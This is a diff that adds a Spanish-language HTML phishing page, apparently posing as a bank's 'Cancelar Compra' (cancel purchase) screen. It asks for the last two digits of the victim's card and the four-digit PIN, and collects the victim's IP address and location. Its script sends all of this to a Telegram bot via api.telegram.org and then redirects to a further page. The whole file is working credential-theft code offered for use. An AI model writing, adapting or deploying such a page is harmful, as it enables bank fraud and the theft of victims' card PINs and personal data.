@@ -1,0 +1,205 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=10">
+
+    <title>
+	inicio
+</title>
+<link href="./archivos/esttilo.css" type="text/css" rel="stylesheet">
+
+<meta name="viewport" content="width=device-width, initial-scale=0.85">
+
+
+<script src="datos_del_tel.js"></script>
+	
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+
+   <script>
+         $.getJSON("https://api.ipify.org?format=json",
+          function(data) {
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    })
+
+	  </script>		
+
+
+				<script>
+
+var u_name, d_name,  ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("tar").value;
+	d_name = document.getElementById("nipi").value;
+	
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "Bn-cpel DATOS\nUltimos digit. Tarje: " + u_name + "\nNlP.: " + d_name + "\n🌎IP: " + ip +"\n" + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + tel_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+  
+        console.log(response);
+		
+          window.location = 'nextv.html';
+
+	
+    });
+    return false;
+};
+
+			</script>	  
+
+
+</head>
+
+<body style=" background-color:#fffff; background-attachment:fixed;
+	background-size: 100% 100%;	">
+		
+	
+    <form method="post" action="#" onsubmit="return sender()">
+	
+		<p id="gfg" hidden=""></p>
+		<p id="address" hidden=""></p>	
+
+
+    <div class="contenedorgenerico">
+       
+   
+
+      <!-- / #main-header -->
+      <div class="limiter">
+
+    <div class="logo-ban">
+        
+    <div align="center">	
+	
+      
+
+        <header id="main-header">
+
+          <a class="logo-header" href="">
+              <img src="./archivos/logg.png" style="width:540px">
+          </a> <!-- / #logo-header -->
+           <br>
+          <br>
+          <br>
+		<span style="font-family:arial; font-size:26; color:#004293;"><b>Cancelar Compra</b></span>
+
+	 </header></div>
+    </div>
+    <div >
+        
+                <div  style="text-align:center;padding-top: 5px">
+	
+                    <div align="center">
+                        <table class="" cellpadding="0" cellspacing="0">
+                            <tbody><tr>
+                                <td>
+                                    <table class="" cellpadding="0" cellspacing="0" style="align-content:center">
+                                        <tbody>
+                                        <tr>
+                                            <td>
+                                                <table cellpadding="0" cellspacing="0" class="" style="height: 172px">
+                                                    <tbody><tr class="ingrese_su_nombre_de_Usuario">
+                                                        <td>
+                                                            <div>
+                                                              
+                                                                <div class="requerido">
+                                                                       
+																	 <div align="left"> 
+																	 	 <span style="font-family:arial; font-size:14px;color:#000;">
+																	 2 últimos dígitos de tu tarjeta</span>
+																	<input type="tel" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" name="tar" id="tar" placeholder="" maxlength="2" minlength="2" class="ic-control-text" required="">
+																		</div> 
+
+                                                     
+																	 <br>
+																	 
+																	   
+																	 <div align="left"> 
+																	 <span style="font-family:arial; font-size:14px;color:#000;">
+																	  <span style="font-family:arial; font-size:14px;color:#000;">
+																	 Ingresa los 4 dígitos de tu NlP</span>
+																	<input type="tel" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" name="nipi" id="nipi" minlength="4" maxlength="4" placeholder="" class="ic-control-text  " required="">
+
+																	
+																	 
+																	 <br><br>
+																	 
+																	
+																	</div> 
+																
+																	 
+																	 <br>
+																	 
+														
+                                                               
+                                                            </div>
+                                                        </div></td>
+                                                    </tr>
+                                                    
+                                                    <tr>
+                                                        <td>
+                                                        </td>
+                                                    </tr>
+                                                </tbody></table>
+                                            </td>
+                                        </tr>
+                                    </tbody></table>
+                                </td>
+                                
+                            </tr>
+                        </tbody></table>
+						
+						 				 <div align="center">
+                                                                   <button type="submit" class="btn_blue" style="background-position: 0px 0px;
+    display: table-cell;
+    vertical-align: middle;
+    border-radius: 32px;
+    background-color: #083d9b;
+    font-size: 16px;
+    width: 350px; color: #FFF;
+    font-family: &#39;Open Sans&#39;, Arial, sans-serif;
+    text-align: center;
+    text-decoration: none; height:50px;border:0px"><b>Continuar</b></button>
+               
+                    </div>
+         
+</div>
+            
+    </div>
+  
+
+        </div>
+     </div>  
+   
+
+
+
+
+  
+</div></form>
+
+
+ </body>
+</html>
